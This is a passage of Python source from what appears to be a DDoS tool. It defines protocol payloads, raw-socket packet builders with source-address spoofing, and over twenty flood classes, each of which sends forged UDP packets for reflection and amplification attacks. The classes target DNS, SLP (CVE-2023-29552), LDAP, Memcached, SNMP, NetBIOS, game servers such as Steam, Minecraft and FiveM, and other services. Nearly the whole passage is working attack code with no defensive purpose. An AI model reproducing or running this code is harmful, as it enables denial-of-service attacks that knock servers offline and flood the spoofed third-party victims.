        return b"\x01" + struct.pack(">Q", int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF) + b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
    @staticmethod
    def steam_a2s_info(): return b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
    @staticmethod
    def quake_getinfo(): return b"\xff\xff\xff\xffgetinfo xxx"
    @staticmethod
    def quake_getstatus(): return b"\xff\xff\xff\xffgetstatus xxx"
    @staticmethod
    def steam_connect(): return b"\xff\xff\xff\xffconnect\x00"
    @staticmethod
    def ripv1_request():
        return (b"\x01\x01\x00\x00" + b"\x00\x02\x00\x00" + b"\x00\x00\x00\x00" +
                b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x01")
    @staticmethod
    def kad_bootstrap_request():
        return b"\xe4\x17" + os.urandom(16) + socket.inet_aton("0.0.0.0") + struct.pack(">H", 0) + struct.pack(">H", 0) + b"\x00"
    @staticmethod
    def bittorrent_dht_get_peers():
        return (b"d1:ad2:id20:" + os.urandom(20) + b"9:info_hash20:" + os.urandom(20) +
                b"e1:q9:get_peers1:t2:" + os.urandom(2) + b"1:y1:qe")
    @staticmethod
    def dns_edns0():
        txid = os.urandom(2)
        header = txid + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x01"
        label = os.urandom(4).hex().encode()
        qname = bytes([len(label)]) + label + b"\x03com\x00"
        q = qname + b"\x00\xff\x00\x01"
        opt = b"\x00" + b"\x00\x29" + b"\x10\x00" + b"\x00\x00\x00\x00" + b"\x00\x00"
        return header + q + opt

# ============================================================================
# Layer4AttackBase — v65.1
# ============================================================================
class Layer4AttackBase:
    def __init__(self, target, stop_event, thread_stop, args, rate_limiter=None):
        self.target = target; self.stop_event = stop_event
        self.thread_stop = thread_stop; self.args = args
        self.rate_limiter = rate_limiter
        self.packets_sent = 0; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self._rawsock = None; self._executor = None

    def _get_rawsock(self):
        if self._rawsock is None:
            try:
                self._rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                self._rawsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self._rawsock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                self._rawsock.setblocking(False)
            except Exception as e:
                self.last_error = f"rawsock:{type(e).__name__}"; self.error_count += 1
                self._rawsock = None
        return self._rawsock

    def _get_broadcast_sock(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); s.setblocking(False)
            return s
        except Exception: return None

    def _send_raw_ip(self, ip_bytes, dst_ip):
        sock = self._get_rawsock()
        if sock is None: return False
        try:
            sock.sendto(ip_bytes, (dst_ip, 0)); return True
        except Exception as e:
            self.last_error = type(e).__name__[:40]; self.error_count += 1
            return False

    def _close_sock(self):
        if self._rawsock is not None:
            try: self._rawsock.close()
            except Exception: pass
            self._rawsock = None

    def _rate_wait(self):
        if self.rate_limiter:
            wait = 0.0001
            while not self.rate_limiter.consume(1):
                if self.stop_event.is_set() or self.thread_stop.is_set(): return
                time.sleep(wait); wait = min(wait * 1.5, 0.01)

    @staticmethod
    def _checksum(data):
        if len(data) % 2: data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF); s += s >> 16
        return ~s & 0xFFFF

    def _build_udp_packet(self, src_ip, dst_ip, src_port, dst_port, payload):
        ip_total_len = 20 + 8 + len(payload)
        ip_id = random.randint(0, 65535); ip_ttl = random.randint(64, 128)
        ip_src = socket.inet_aton(src_ip); ip_dst = socket.inet_aton(dst_ip)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0, ip_ttl, 17, 0, ip_src, ip_dst)
        cs = self._checksum(iph)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0, ip_ttl, 17, cs, ip_src, ip_dst)
        udph = struct.pack("!HHHH", src_port, dst_port, 8 + len(payload), 0)
        return iph + udph + payload

    def _build_tcp_syn_packet(self, src_ip, dst_ip, src_port, dst_port):
        ip_total_len = 40; ip_id = random.randint(0, 65535); ip_ttl = random.randint(64, 128)
        ip_src = socket.inet_aton(src_ip); ip_dst = socket.inet_aton(dst_ip)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0, ip_ttl, 6, 0, ip_src, ip_dst)
        cs = self._checksum(iph)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0, ip_ttl, 6, cs, ip_src, ip_dst)
        seq = random.randint(0, 2**32 - 1); window = random.randint(1024, 65535)
        tcph = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, 0, 0x50, 0x02, window, 0, 0)
        pseudo = ip_src + ip_dst + struct.pack("!BBH", 0, 6, len(tcph))
        tcs = self._checksum(pseudo + tcph)
        tcph = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, 0, 0x50, 0x02, window, tcs, 0)
        return iph + tcph

    @staticmethod
    def _rand_ip():
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# ============================================================================
# L4 Attack Classes — v65.1
# ============================================================================
class SteamAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 27015; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"Steam A2S_INFO - port {self.port} (5.5x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.steam_a2s_info()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class QuakeAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 27960; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"Quake getinfo - port {self.port} (63.9x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.quake_getinfo()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class DNSEDNS0Attack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("DNS EDNS0 - active (>54x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 53, GamePayloads.dns_edns0()), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class RIPv1Attack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("RIPv1 - active (131.24x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.ripv1_request()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, 520, 520, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class KadAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("Kad P2P - active (16.3x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 4672, GamePayloads.kad_bootstrap_request()), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class BitTorrentAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("BitTorrent DHT - active (3.8-50x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 6881, GamePayloads.bittorrent_dht_get_peers()), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class SLPAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("SLP Amp - active (CVE-2023-29552, 2200x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = b"\x02\x01\x00\x00\x36\x20\x00\x00\x00\x00\x00\x01\x00\x02\x65\x6e\x00\x00\x00\x15\x73\x65\x72\x76\x69\x63\x65\x3a\x73\x65\x72\x76\x69\x63\x65\x2d\x61\x67\x65\x6e\x74\x00\x00\x00\x00\x00"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 427, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class LDAPAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("LDAP Amp - active (46-70x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
                   b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
                   b"\x63\x74\x63\x6c\x61\x73\x73\x30\x00")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 389, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class QOTDAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("QOTD Amp - active (140.3x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 17, b"\x00"), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class TFTPAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("TFTP Amp - active (60x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = b"\x00\x01" + b"boot.bin\x00" + b"octet\x00"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 69, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class SNMPv2Attack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("SNMPv2 Amp - active (6.3x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = (b"\x30\x20\x02\x01\x01\x04\x06public\xa5\x13\x02\x04\x00\x00"
                   b"\x00\x00\x02\x01\x00\x02\x01\x00\x30\x05\x06\x01\x00\x05\x00")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 161, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class NetBIOSAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("NetBIOS Amp - active (3.8x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = (b"\xe5\xd8\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   b"\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                   b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                   b"\x41\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 137, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class mDNSAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("mDNS Amp - active (2-10x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = (b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   b"\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 5353, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class PortmapAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("Portmap Amp - active (7-28x)")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = (b"\x80\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0"
                   b"\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x00"
                   b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 111, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class VSEAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 27015; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"VSE (Valve Source Engine) - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.vse_ping()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class TS3Attack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 9987; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"TS3 (TeamSpeak 3) - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.ts3_ping()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class FIVEMAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 30120; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"FIVEM - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.fivem_getinfo()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class FIVEMTokenAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 30120; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"FIVEM-TOKEN - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                token = os.urandom(random.randint(8, 32)).hex()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, GamePayloads.fivem_getinfo_token(token)), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class MinecraftAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 25565; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"MINECRAFT - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        handshake = GamePayloads.minecraft_handshake(self.target, self.port, 759)
        ping = GamePayloads.minecraft_ping()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, handshake + ping), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class MCBOTAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 25565; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"MCBOT - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        handshake = GamePayloads.minecraft_handshake(self.target, self.port, 759)
        login_start = b"\x00" + b"\x00" + b"Bot" + b"\x00"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, handshake + login_start), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class MCPEAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 19132; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"MCPE - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = GamePayloads.mcpe_ping()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class ARDAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 3283; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"ARD (Apple Remote Desktop) - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = b"\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class RDPAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None, victim_ip=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 3389; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"RDP Amplification - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class MemcachedAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("Memcached Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        req = b"\x00\x00\x00\x00\x00\x01\x00\x00get large_key\r\n"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
